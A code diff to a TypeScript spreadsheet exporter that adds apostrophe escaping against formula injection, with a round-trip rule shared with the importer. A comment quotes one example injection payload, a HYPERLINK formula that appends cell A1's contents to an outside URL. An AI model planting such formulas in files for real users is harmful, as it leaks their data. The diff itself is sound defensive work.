@@ -26,9 +26,45 @@ import type { AppState, Element } from './types'
 // with the importer so one character defines the format on both sides.
 export const COLLECTION_SEPARATOR = '|'
 
-// Sanitize a plain text cell: collapse tabs and newlines to spaces.
+// ── Formula injection ─────────────────────────────────────────────────────────
+//
+// Excel, Numbers and LibreOffice treat a cell beginning '=', '+', '-' or '@' as
+// a formula, not as text. Chora's own reader does not, but this file is written
+// to be opened in a spreadsheet — that is the entire point of it — so an element
+// named `=HYPERLINK("https://…"&A1,"Results")` becomes live code in the
+// recipient's spreadsheet. The name only has to survive one hop: someone shares
+// a dataset, someone else exports it and double-clicks the result.
+//
+// The fix is the conventional one: prefix the cell with an apostrophe, which
+// every spreadsheet reads as "the rest of this is text".
+//
+// It has to survive a round-trip, so the apostrophe is escaped too, and the
+// importer removes exactly one — and only when what follows could have needed
+// escaping. That leaves a hand-authored name like "'Tis the season" alone,
+// since 'T' is not a formula lead, while still restoring "'=Total" to "=Total".
+// See unescapeSpreadsheetFormula in importer.ts, which must stay its inverse.
+//
+// Numeric columns (weights, scores) are written directly rather than through
+// cell(), so a number is never given a leading apostrophe and still arrives in
+// the spreadsheet as a number. Weights are non-negative, so none of them can
+// begin with '-'.
+
+const FORMULA_LEAD = /^[=+\-@]/
+
+/** True when removing a leading apostrophe would change the value's meaning. */
+export function isFormulaEscaped(value: string): boolean {
+  const rest = value.slice(1)
+  return value.startsWith("'") && (FORMULA_LEAD.test(rest) || rest.startsWith("'"))
+}
+
+function escapeFormula(s: string): string {
+  return FORMULA_LEAD.test(s) || s.startsWith("'") ? `'${s}` : s
+}
+
+// Sanitize a plain text cell: collapse tabs and newlines to spaces, then
+// neutralize anything a spreadsheet would evaluate.
 function cell(s: string): string {
-  return s.replace(/\t/g, ' ').replace(/\r?\n/g, ' ')
+  return escapeFormula(s.replace(/\t/g, ' ').replace(/\r?\n/g, ' '))
 }
 
 // Wrap a text value in double-quotes, escaping any embedded quotes as "".
